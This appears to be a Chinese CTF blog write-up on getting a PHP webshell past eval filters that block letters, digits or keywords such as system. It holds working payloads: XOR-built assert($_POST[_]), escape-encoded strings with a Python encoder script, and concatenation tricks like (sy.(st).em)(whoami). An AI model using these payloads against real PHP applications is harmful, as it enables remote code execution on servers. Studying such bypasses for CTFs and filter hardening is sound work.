CTF中不包含数字字母或其它的构造webshell绕过小结

PHP Webshell
CTF
发布日期:   2021-06-26

以一段代码为头来引入话题

<?php
if(!preg_match('/[a-z0-9]/is',$_GET['shell'])) {
  eval($_GET['shell']);
}

对于这样的一段代码，怎么绕过来构造webshell？

解决方法：

$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`'); // $_='assert';
$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']'); // $__='_POST';
$___=$$__;
$_($___[_]); // assert($_POST[_]);

这是一种，如果不了解的人可能直接看懵逼了，这都是什么玩意。

绕过姿势

为什么我们能够通过以上复杂的代码构造webshell或者其他任意代码的执行，这有功于php语言是个弱类型的语言，它的true和false很灵活。

在php中**true是1，flase是0,**而 

'>' > '<' == 1
//大于号 大于 小于号 是正确的，所以结果为true，也就是1

所以，我们即使没有数字，我们也可以通过非数字、字母构造出数字

除了大于等于号，其它任何能表示true的，都可以构造出数字1

然后再通过加减乘除运算，就可以得到所有的想要的数字。

比如

!!a == 1
//双重否定字符，在php中没加引号的未定义字符会被当作字符处理

那字母呢？

对于字母来说，也有很多姿势

比如异或或者取反这种位运算是用的很多的，还可以通过php的语言特性

字符串和数组强制连接的话，就会返回array这个字符串，再通过++–可以得到所有字母。

**==异或^==**（可操作性很大，有很多姿势）：

可以字母、数字、非字母数字之间自由异或

当两个字符异或时，异或出来的字符，反过来与两个字符其中一个字符异或，结果是两个字符中另一个(因为异或完存在很多不可见字符，所以用urlencode编码)

**==取反~==**（可操作性大，有很多姿势）

可以中文字符取反，UTF-8编码的某个汉字，并将其中某个字符取出来，比如’和’{2}的结果是”\x8c”，其取反即为字母s

也可以==直接对字符串取反==，这样得到的并不是字母，而是一些其他字符（多为不可见字符），也是一种绕过的方式。

上面那些是拿到目标字符串的方法，而要构造webshell，灵活的将上面的方法交叉运用，及利用php5，php7的执行代码的方式，进行字符串拼接，来构造webshell

php5中可以通过

<?php
$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`'); // $_='assert';

其他绕过类型

除了过滤字母数字，有时候会过滤一些关键词或者各种各样的绕过

但，万变不离其宗，都是要利用php的特性，进行绕过

下面介绍几种别的绕过方式，具体情况视情况而定

字符串转义绕过

以八进制表示的\[0–7]{1,3}转义字符会自动适配byte（如"\400" == “\000”）

以十六进制的\x[0–9A-Fa-f]{1,2}转义字符表示法（如“\x41"）

以Unicode表示的\u{[0–9A-Fa-f]+}字符，会输出为UTF-8字符串

注意这里转义后的字符必须双引号包裹传参

这里八进制可以同时绕过字母的限制，而其他转义因为包含字母和数字，所以不能绕过

Payload处理脚本如下：

# -*- coding:utf-8 -*-

def hex_payload(payload):
	res_payload = ''
	for i in payload:
		i = "\\x" + hex(ord(i))[2:]
		res_payload += i
	print("[+]'{}' Convert to hex: \"{}\"".format(payload,res_payload))

def oct_payload(payload):
	res_payload = ""
	for i in payload:
		i = "\\" + oct(ord(i))[2:]
		res_payload += i
	print("[+]'{}' Convert to oct: \"{}\"".format(payload,res_payload))

def uni_payload(payload):
	res_payload = ""
	for i in payload:
		i = "\\u{<!-- -->{<!-- -->{0}}}".format(hex(ord(i))[2:])
		res_payload += i
	print("[+]'{}' Convert to unicode: \"{}\"".format(payload,res_payload))

if __name__ == '__main__':
	payload = 'phpinfo'
	hex_payload(payload)
	oct_payload(payload)
	uni_payload(payload)

内置函数访问绕过

get_defined_functions()函数：返回所有已定义的函数的数组

利用这种方法首先还需要知道PHP的具体版本，因为每个版本的get_defined_functions()返回的值都是不一样的，这里以php7.3.4为准

字符串拼接绕过

字符串拼接绕过适用于绕过过滤具体关键字的限制

<?php
highlight_file(__FILE__);
error_reporting(0);
$cmd=$_GET['cmd'];
if(isset($cmd)){
    if(preg_match('/phpinfo|system|exec|passthru/i',$cmd)){
        die('No');
    }else{
        eval($cmd);
    }
}else{
    echo "welcome";
}

payload

GET:
?cmd=(p.h.p.i.n.f.o)();


(sy.(st).em)(whoami);
(sy.(st).em)(who.ami);
(s.y.s.t.e.m)("whoami");

在PHP中不一定需要引号(单引号/双引号)来表示字符串。PHP支持我们声明元素的类型，比如$name = (string)mochu7;，在这种情况下，$name就包含字符串"mochu7"，此外，如果不显示声明类型，那么PHP会将圆括号内的数据当成字符串来处理 .
